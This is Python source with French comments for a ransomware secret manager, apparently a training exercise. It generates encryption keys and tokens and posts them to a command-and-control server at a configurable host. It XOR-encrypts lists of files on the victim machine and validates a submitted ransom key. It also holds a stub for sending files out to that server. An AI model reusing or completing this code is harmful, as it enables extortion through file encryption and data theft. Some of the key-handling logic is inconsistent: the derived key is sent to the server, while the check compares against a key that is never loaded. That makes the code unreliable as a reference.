from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:

        # Créer un objet PBKDF2HMAC pour dériver la clé
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=self.KEY_LENGTH,      
            salt=salt,                   # Le sel utilisé
            iterations=self.ITERATION,   
        )
        return kdf.derive(key)


    def create(self) -> Tuple[bytes, bytes, bytes]:

        
        salt = secrets.token_bytes(self.SALT_LENGTH)    # Générer un sel aléatoire
        
        key = secrets.token_bytes(self.KEY_LENGTH) # Générer une clé aléatoire      
        derived_key = self.do_derivation(salt, key) # Dériver la clé à partir du sel et de la clé     
        token = secrets.token_bytes(self.TOKEN_LENGTH) # Générer un token aléatoire  

        return salt, derived_key, token


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
            # Création du dictionnaire à envoyer avec la conversion en base 64 (fonction précédente)
            payload = {
                "token": self.bin_to_b64(token),  
                "salt": self.bin_to_b64(salt),    
                "key": self.bin_to_b64(key)        
            }

            
            url = f"http://{self._remote_host_port}/new"# URL vers laquelle on envoie la requête POST

            try:
                # Envoi de la requête POST avec le JSON
                response = requests.post(url, json=payload)
                response.raise_for_status()  # Vérifie si la requête a réussi
                
                self._log.debug(f"Reponse du CNC: {response.json()}")#  log de la réponse 
            except requests.exceptions.RequestException as e:
                
                self._log.error(f"Failed to post to CNC: {e}")#log de l'erreur

    def setup(self) -> None:
   
        salt, derived_key, token = self.create()

        # Création du répertoire de sauvegarde si besoin
        os.makedirs(self._path, exist_ok=True)

        # Sauvegarde du sel dans un fichier binaire local
        salt_path = os.path.join(self._path, "salt.bin")
        with open(salt_path, "wb") as f:
            f.write(salt)  # On écrit le sel en binaire dans le fichier

        # Sauvegarde du token de la même manière
        token_path = os.path.join(self._path, "token.bin")
        with open(token_path, "wb") as f:
            f.write(token)  # On stocke le token

        # Transmission des données cryptographiques au serveur CNC pour l'enregistrement
        self.post_new(salt, derived_key, token)


    def load(self) -> None:
        # Définition des chemins complets 
        chemin_salt = os.path.join(self._path, "salt.bin")
        chemin_token = os.path.join(self._path, "token.bin")

        try:
            #  lecture du fichier "salt.bin" et chargement du contenu dans self._salt
            with open(chemin_salt, "rb") as fichier_salt:
                self._salt = fichier_salt.read()
            self._log.info("Sel chargé avec succès depuis 'salt.bin'.")

            # lecture du fichier "token.bin" et chargement du contenu dans self._token
            with open(chemin_token, "rb") as fichier_token:
                self._token = fichier_token.read()
            self._log.info("Token chargé avec succès depuis 'token.bin'.")

        except FileNotFoundError as erreur_fichier:
            # Log une erreur si le fichier est introuvable
            self._log.error(f"Erreur : Fichier manquant - {erreur_fichier}")
        except Exception as e:
            # Log des autres erreurs
            self._log.error(f"Erreur lors du chargement des éléments cryptographiques : {e}")


    def check_key(self, candidate_key: bytes) -> bool:

        try:
            # Dérivation de la clé pour pouvoir comparer
            derived_candidate_key = self.do_derivation(self._salt, candidate_key)
            return derived_candidate_key == self._key
        except Exception as e:
            self._log.error(f"Erreur lors de la vérification de la clé : {e}")
            return False

    def set_key(self, b64_key: str) -> None:

        try:
            # Décode la clé en base64 pour obtenir la clé binaire
            candidate_key = base64.b64decode(b64_key)
        except Exception as e:
            self._log.error("Échec du décodage base64 de la clé.")
            raise ValueError("Erreur : clé fournie invalide.")

        # Validation de la clé décodée
        if self.check_key(candidate_key):
            self._key = candidate_key
            self._log.info("Clé correcte, chargée avec succès.")
        else:
            self._log.error("La clé fournie est incorrecte.")
            raise ValueError("Erreur : la clé fournie est incorrecte.")
    
    def get_hex_token(self) -> str:

        if self._token is None:
            self._log.error("Erreur : le token n'est pas défini.") #log si il y a une erreur
            return ""
        
       
        hashed_token = sha256(self._token).hexdigest() # Hacher le token avec SHA-256 et le convertir en hexadécimal
        
        return hashed_token


    def xorfiles(self, files: List[str]) -> None:
      
        # Vérifie que la clé de chiffrement est bien définie
        if self._key is None:
            self._log.error("Erreur : Clé de chiffrement non définie. Exécutez setup() ou set_key() au préalable.")
            return
        
        # Parcours des fichiers pour appliquer le chiffrement
        for file_path in files:
            # Vérifie l'existence du fichier
            if os.path.isfile(file_path):
                try:
                    # Chiffre le fichier 
                    xorfile(file_path, self._key)
                    self._log.info(f"Fichier chiffré : {file_path}") #log si réussi
                except Exception as e:
                    self._log.error(f"Erreur de chiffrement pour {file_path} : {e}") #log si erreur
            else:
                # Log si le fichier est introuvable
                self._log.warning(f"Fichier introuvable ou chemin incorrect : {file_path}")


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self) -> None:

        # Définir les chemins des fichiers à supprimer
        salt_path = os.path.join(self._path, "salt.bin")
        token_path = os.path.join(self._path, "token.bin")
        
        # supprimer le fichier de sel
        try:
            if os.path.exists(salt_path):
                os.remove(salt_path)
                self._log.info("Le fichier 'salt.bin' a été supprimé avec succès.")
            else:
                self._log.warning("Aucun fichier 'salt.bin' trouvé à supprimer.")
        except Exception as e:
            self._log.error(f"Erreur lors de la suppression de 'salt.bin' : {e}")
        
        # supprimer le fichier de token
        try:
            if os.path.exists(token_path):
                os.remove(token_path)
                self._log.info("Le fichier 'token.bin' a été supprimé avec succès.")
            else:
                self._log.warning("Aucun fichier 'token.bin' trouvé à supprimer.")
        except Exception as e:
            self._log.error(f"Erreur lors de la suppression de 'token.bin' : {e}")
